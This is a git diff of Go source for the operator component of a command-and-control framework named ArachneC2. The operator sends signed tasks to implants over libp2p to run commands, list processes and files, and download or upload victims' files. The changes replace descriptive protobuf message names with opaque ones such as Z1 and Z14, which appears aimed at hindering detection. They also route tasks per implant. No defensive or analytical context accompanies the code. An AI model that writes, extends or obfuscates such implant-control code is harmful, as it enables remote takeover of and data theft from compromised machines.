@@ -8,20 +8,20 @@ import (
 	"log"
 	"net"
 	"os"
+	"sort"
 	"sync"
 	"time"
-
-	"golang.org/x/term"
 
 	"github.com/libp2p/go-libp2p"
 	"github.com/libp2p/go-libp2p/core/crypto"
 	"github.com/libp2p/go-libp2p/core/peer"
-	tcp "github.com/libp2p/go-libp2p/p2p/transport/tcp"
+	"github.com/libp2p/go-libp2p/p2p/transport/tcp"
 	"google.golang.org/protobuf/proto"
+	"golang.org/x/term"
 
-	arachnepb "github.com/portbuster1337/ArachneC2/protobuf/arachnepb"
 	"github.com/portbuster1337/ArachneC2/pkg/cryptography"
 	"github.com/portbuster1337/ArachneC2/pkg/transport"
+	apb "github.com/portbuster1337/ArachneC2/protobuf/apb"
 )
 
 type ImplantRecord struct {
@@ -196,7 +196,7 @@ func (o *Operator) discoverPeersLoop(ns string) {
 	}
 }
 
-func (o *Operator) handleMessage(ctx context.Context, env *arachnepb.Envelope, senderPub crypto.PubKey) {
+func (o *Operator) handleMessage(ctx context.Context, env *apb.Envelope, senderPub crypto.PubKey) {
 	switch env.Type {
 	case transport.MsgTypeRegister:
 		o.handleBeaconRegister(env)
@@ -219,8 +219,8 @@ func (o *Operator) handleMessage(ctx context.Context, env *arachnepb.Envelope, s
 	}
 }
 
-func (o *Operator) handleBeaconRegister(env *arachnepb.Envelope) {
-	beaconReg := &arachnepb.BeaconRegister{}
+func (o *Operator) handleBeaconRegister(env *apb.Envelope) {
+	beaconReg := &apb.Z1{}
 	if err := proto.Unmarshal(env.Data, beaconReg); err != nil {
 		log.Printf("[operator] unmarshal beacon register: %v", err)
 		return
@@ -283,7 +283,7 @@ func (o *Operator) handleBeaconRegister(env *arachnepb.Envelope) {
 	o.messenger.AddKnownImplant(peerID, pubKey)
 }
 
-func (o *Operator) senderPeerID(reg *arachnepb.Register) string {
+func (o *Operator) senderPeerID(reg *apb.Register) string {
 	return reg.ActiveC2
 }
 
@@ -291,9 +291,15 @@ func (o *Operator) ListImplants() []*ImplantRecord {
 	o.mu.RLock()
 	defer o.mu.RUnlock()
 
+	ids := make([]string, 0, len(o.implants))
+	for id := range o.implants {
+		ids = append(ids, id)
+	}
+	sort.Strings(ids)
+
 	out := make([]*ImplantRecord, 0, len(o.implants))
-	for _, rec := range o.implants {
-		out = append(out, rec)
+	for _, id := range ids {
+		out = append(out, o.implants[id])
 	}
 	return out
 }
@@ -316,25 +322,25 @@ func (o *Operator) sendCommandToImplant(implantPeerID string, msgType uint32, ms
 	}
 
 	env := o.messenger.CreateEnvelope(msgType, data)
-	return o.messenger.SignAndSend(o.ctx, o.messenger.CommandTopic(), env)
+	return o.messenger.SignAndSend(o.ctx, o.messenger.TaskTopic(implantPeerID), env)
 }
 
 func (o *Operator) Ps(implantPeerID string) error {
-	req := &arachnepb.PsReq{}
+	req := &apb.Z12{}
 	return o.sendCommandToImplant(implantPeerID, transport.MsgTypePs, req)
 }
 
 func (o *Operator) Ping(implantPeerID string) error {
-	return o.sendCommandToImplant(implantPeerID, transport.MsgTypePing, &arachnepb.Ping{})
+	return o.sendCommandToImplant(implantPeerID, transport.MsgTypePing, &apb.Ping{})
 }
 
 func (o *Operator) Ls(implantPeerID string, path string) error {
-	req := &arachnepb.LsReq{Path: path}
+	req := &apb.Z16{Path: path}
 	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeLs, req)
 }
 
 func (o *Operator) Execute(implantPeerID string, cmd string, args []string) error {
-	req := &arachnepb.ExecuteReq{
+	req := &apb.Z14{
 		Path:   cmd,
 		Args:   args,
 		Output: true,
@@ -342,8 +348,8 @@ func (o *Operator) Execute(implantPeerID string, cmd string, args []string) erro
 	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeExecute, req)
 }
 
-func (o *Operator) handlePsResult(env *arachnepb.Envelope) {
-	result := &arachnepb.Ps{}
+func (o *Operator) handlePsResult(env *apb.Envelope) {
+	result := &apb.Z13{}
 	if err := proto.Unmarshal(env.Data, result); err != nil {
 		log.Printf("[operator] unmarshal ps result: %v", err)
 		return
@@ -354,8 +360,8 @@ func (o *Operator) handlePsResult(env *arachnepb.Envelope) {
 	}
 }
 
-func (o *Operator) handleLsResult(env *arachnepb.Envelope) {
-	result := &arachnepb.Ls{}
+func (o *Operator) handleLsResult(env *apb.Envelope) {
+	result := &apb.Z17{}
 	if err := proto.Unmarshal(env.Data, result); err != nil {
 		log.Printf("[operator] unmarshal ls result: %v", err)
 		return
@@ -370,8 +376,8 @@ func (o *Operator) handleLsResult(env *arachnepb.Envelope) {
 	}
 }
 
-func (o *Operator) handleExecuteResult(env *arachnepb.Envelope) {
-	result := &arachnepb.Execute{}
+func (o *Operator) handleExecuteResult(env *apb.Envelope) {
+	result := &apb.Z15{}
 	if err := proto.Unmarshal(env.Data, result); err != nil {
 		log.Printf("[operator] unmarshal execute result: %v", err)
 		return
@@ -386,8 +392,8 @@ func (o *Operator) handleExecuteResult(env *arachnepb.Envelope) {
 	}
 }
 
-func (o *Operator) handlePwdResult(env *arachnepb.Envelope) {
-	result := &arachnepb.Pwd{}
+func (o *Operator) handlePwdResult(env *apb.Envelope) {
+	result := &apb.Z21{}
 	if err := proto.Unmarshal(env.Data, result); err != nil {
 		log.Printf("[operator] unmarshal pwd result: %v", err)
 		return
@@ -395,8 +401,8 @@ func (o *Operator) handlePwdResult(env *arachnepb.Envelope) {
 	fmt.Println(result.Path)
 }
 
-func (o *Operator) handleDownloadResult(env *arachnepb.Envelope) {
-	result := &arachnepb.Download{}
+func (o *Operator) handleDownloadResult(env *apb.Envelope) {
+	result := &apb.Z23{}
 	if err := proto.Unmarshal(env.Data, result); err != nil {
 		log.Printf("[operator] unmarshal download result: %v", err)
 		return
@@ -416,8 +422,8 @@ func (o *Operator) handleDownloadResult(env *arachnepb.Envelope) {
 	fmt.Printf("downloaded %s (%d bytes)\n", path, len(result.Data))
 }
 
-func (o *Operator) handleUploadResult(env *arachnepb.Envelope) {
-	result := &arachnepb.Upload{}
+func (o *Operator) handleUploadResult(env *apb.Envelope) {
+	result := &apb.Z25{}
 	if err := proto.Unmarshal(env.Data, result); err != nil {
 		log.Printf("[operator] unmarshal upload result: %v", err)
 		return
@@ -426,22 +432,22 @@ func (o *Operator) handleUploadResult(env *arachnepb.Envelope) {
 }
 
 func (o *Operator) Cd(implantPeerID string, path string) error {
-	req := &arachnepb.CdReq{Path: path}
+	req := &apb.Z19{Path: path}
 	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeCd, req)
 }
 
 func (o *Operator) Pwd(implantPeerID string) error {
-	req := &arachnepb.PwdReq{}
+	req := &apb.Z20{}
 	return o.sendCommandToImplant(implantPeerID, transport.MsgTypePwd, req)
 }
 
 func (o *Operator) Download(implantPeerID string, path string) error {
-	req := &arachnepb.DownloadReq{Path: path}
+	req := &apb.Z22{Path: path}
 	return o.sendCommandToImplant(implantPeerID, transport.MsgTypeDownload, req)
 }
 
 func (o *Operator) Upload(implantPeerID string, path string, data []byte) error {
-	req := &arachnepb.UploadReq{
+	req := &apb.Z24{
 		Path:      path,
 		Data:      data,
 		Overwrite: true,
